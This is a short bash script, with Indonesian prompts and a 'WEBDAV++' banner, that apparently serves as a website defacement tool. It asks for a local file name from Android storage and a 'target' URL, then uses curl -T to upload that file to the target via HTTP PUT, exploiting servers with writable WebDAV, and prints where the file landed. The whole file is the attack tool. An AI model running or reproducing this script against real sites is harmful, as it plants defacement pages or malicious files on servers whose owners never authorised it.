#usr/bin/bash

figlet WEBDAV++ | lolcat
echo "=================================" | lolcat
echo "Masukan Nama Script Anda"
read -p "root@WEBDAV++~# " sc
echo "Masukan Target Anda"
read -p "root@EZDEPES~# " url
echo ""
echo "[ Script : $sc ]"
echo "[ Target : $url ]"
curl -T /storage/emulated/0/$sc $url
echo "Done ~> $url$sc"
echo ""
echo "Run : sh ez.sh"
exit